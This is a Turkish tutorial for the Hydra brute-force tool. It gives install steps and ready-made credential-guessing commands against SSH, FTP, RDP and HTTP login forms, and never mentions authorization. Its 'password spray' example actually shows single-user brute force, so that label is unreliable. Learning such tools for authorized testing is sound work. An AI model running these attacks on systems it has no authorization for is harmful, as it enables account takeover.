# Hydra Kullanım Rehberi

Bu rehber, popüler bir brute-force aracı olan **Hydra**'nın temel kullanımını ve komutlarını açıklamak için hazırlanmıştır. Hydra, farklı protokoller üzerinde oturum açma işlemlerini test etmek için çok yönlü ve güçlü bir araçtır.

---

## Hydra Nedir?
Hydra, çoklu protokol desteği sunarak hızlı ve etkin brute-force saldırıları gerçekleştirmek için tasarlanmış bir araçtır. SSH, FTP, HTTP, RDP gibi birçok servisi destekler.

---

## Kurulum

Hydra'yı kurmak için aşağıdaki adımları izleyebilirsiniz:

### 1. Debian/Ubuntu:
```bash
sudo apt update && sudo apt install hydra
```

### 2. Red Hat/CentOS:
```bash
sudo yum install hydra
```

### 3. Kaynaktan Kurulum:
```bash
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra
./configure
make
sudo make install
```

### Kurulum Doğrulama:
Kurulumun başarılı olup olmadığını kontrol etmek için:
```bash
hydra -h
```

---

## Hydra Kullanımı

Hydra, aşağıdaki formatta çalışır:
```bash
hydra -L <KULLANICI_LISTESİ> -P <PAROLA_LISTESİ> -s <PORT> -t <THREAD_SAYISI> <HEDEF_IP> <PROTOKOL>
```

### 1. Temel Komut Örneği
Bir SSH servisini hedef alarak kullanıcı adı ve parola brute-force işlemi:
```bash
hydra -L users.txt -P passwords.txt -s 22 -t 4 192.168.1.10 ssh
```

- **`-L users.txt`**: Kullanıcı listesi.
- **`-P passwords.txt`**: Parola listesi.
- **`-s 22`**: Hedef port.
- **`-t 4`**: Aynı anda çalışacak thread sayısı.
- **`192.168.1.10`**: Hedef IP adresi.
- **`ssh`**: Hedef protokol.

---

### 2. HTTP Brute-Force
Bir web uygulamasına brute-force saldırısı:
```bash
hydra -L users.txt -P passwords.txt -s 80 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^:F=Hatalı giriş"
```

- **`/login`**: Giriş sayfasının yolu.
- **`username=^USER^&password=^PASS^`**: Form parametreleri.
- **`F=Hatalı giriş`**: Hatalı giriş mesajı (örneğin: "Invalid login").

---

### 3. FTP Brute-Force
Bir FTP servisini brute-force ile hedeflemek için:
```bash
hydra -L users.txt -P passwords.txt -s 21 -t 8 192.168.1.10 ftp
```

---

### 4. RDP (Remote Desktop Protocol)
Bir Windows sisteminde RDP brute-force saldırısı:
```bash
hydra -L users.txt -P passwords.txt -t 4 192.168.1.10 rdp
```

---

### 5. Tüm Hedeflere Aynı Parola (Password Spray)
Bir parola listesini tüm kullanıcılar üzerinde test etmek:
```bash
hydra -l admin -P passwords.txt -t 8 192.168.1.10 ssh
```

- **`-l admin`**: Tek bir kullanıcı adı için brute-force.
- **`-P passwords.txt`**: Parola listesi.

---

## Örnek Protokoller
Hydra'nın desteklediği yaygın protokoller:

| Protokol | Açıklama               |
|----------|-----------------------|
| ssh      | SSH bağlantısı        |
| ftp      | FTP bağlantısı        |
| http-get | HTTP GET istekleri    |
| http-post| HTTP POST formları    |
| rdp      | RDP bağlantısı        |
| smb      | SMB dosya paylaşımı   |

Hydra'nın desteklediği tüm protokolleri görmek için:
```bash
hydra -U
```

---

## Çıktıları Kaydetme
Hydra çıktısını bir dosyaya kaydetmek için `-o` parametresini kullanabilirsiniz:
```bash
hydra -L users.txt -P passwords.txt -t 4 192.168.1.10 ssh -o results.txt
```

---

## Hata Giderme

- **Hata:** "Restorefile found, continuing session"
  - Çözüm: Önceki oturumu temizlemek için:
    ```bash
    rm -f ./hydra.restore
    ```

- **Hata:** "Too many connection errors"
  - Çözüm: Thread sayısını azaltarak deneyin:
    ```bash
    hydra -L users.txt -P passwords.txt -t 2 192.168.1.10 ssh
    ```

- **Hata:** "Connection refused"
  - Çözüm: Hedef servisin açık olduğundan emin olun ve doğru portu kullanın:
    ```bash
    nmap -p <PORT> <HEDEF_IP>
    ```

---

## Ek Kaynaklar
- [Hydra Resmi GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Hydra Kullanım Belgeleri](https://tools.kali.org/password-attacks/hydra)

---

Bu rehber, Hydra aracı ile temel brute-force saldırıları gerçekleştirmenize yardımcı olmak için hazırlanmıştır. Daha fazla bilgi ve gelişmiş kullanım senaryoları için resmi belgelere göz atabilirsiniz.
